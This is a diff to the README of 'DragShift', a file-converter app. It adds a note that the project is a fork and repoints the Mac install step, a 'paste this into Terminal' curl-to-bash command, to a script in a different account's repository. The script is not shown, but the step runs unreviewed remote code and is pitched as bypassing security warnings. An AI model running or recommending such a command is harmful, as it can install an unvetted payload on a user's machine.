@@ -2,6 +2,8 @@
 
 Convert and edit files on **Windows, Mac and Linux** with a liquid-glass radial menu. Start dragging any file, press **Shift**, and drop it on a slice.
 
+This is a fork of [llamaboi55/DragShift](https://github.com/llamaboi55/DragShift) that adds **Remove BG**: cut the subject out of a photo and save it with a transparent background ([how to use it](#remove-a-background)).
+
 ![DragShift radial menu and Add BG editor](docs/preview.png)
 
 ## Download
@@ -14,7 +16,7 @@ From the [latest release](../../releases/latest):
 **Mac (easiest, no security warning):** paste this into Terminal:
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/llamaboi55/DragShift/main/install-mac.sh | bash
+curl -fsSL https://raw.githubusercontent.com/kappesrez-cyber/DragShift-by-domwq/main/install-mac.sh | bash
 ```
 
 It picks the right build for your Mac, installs it to Applications and opens it ([see what it does](install-mac.sh)). Run the same line again to update.
